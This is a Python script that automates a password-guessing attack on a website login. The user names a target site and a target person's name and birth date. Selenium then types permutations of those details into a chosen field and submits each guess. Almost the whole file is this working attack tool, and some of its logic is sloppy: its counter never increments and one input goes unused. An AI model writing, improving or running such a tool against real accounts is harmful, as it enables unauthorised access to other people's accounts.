import itertools
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

print("ATTENTION! This program could take a lot of power from your computer because it will try every single combinations, if you want it to take less power enter less information.")
input("Click enter if you have read and understand.")


def generate_passwords(name, birth_date, other_info):
    # Extract day, month, and year from the birth date
    day, month, year = birth_date.split('/')
    
    # Generate combinations with different parts of personal information
    info_combinations = [
        name,
        day,
        month,
        year,
        day + month,
        day + year,
        month + day,
        month + year,
        year + day,
        year + month,
        name + day,
        name + month,
        name + year,
        name + day + month,
        name + day + year,
        name + month + day,
        name + month + year,
        name + year + day,
        name + year + month
    ]
    timeSleep = 0.5

    website = input("Quel site voulez_vous prendre pour cible")

    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service)
    driver.get(website)
    xpath = input("Tapez le xpath")

    input_xpath_messageBox = xpath
    input_messageBox = driver.find_element(by=By.XPATH,
    value=input_xpath_messageBox)
    time.sleep(timeSleep)

    print("Le processus peut commencer")

    count = 0
    for combination in info_combinations:
        for length in range(1, len(combination) + 1):
            for perm in itertools.permutations(combination, length):
                password = ''.join(perm)
                input_messageBox.send_keys(password)
                input_messageBox.send_keys(Keys.ENTER)
                input_messageBox.clear()
                time.sleep(timeSleep)
    
    return count

# Prompt the user for personal information
name = input("Enter the target's name: ")
birth_date = input("Enter the target's birth date (in dd/mm/yyyy format): ")
other_info = input("Enter any other personal information: ")

# Generate potential passwords and count
print("\nGenerated passwords:")
total_count = generate_passwords(name, birth_date, other_info)
print("Total passwords generated:", total_count)
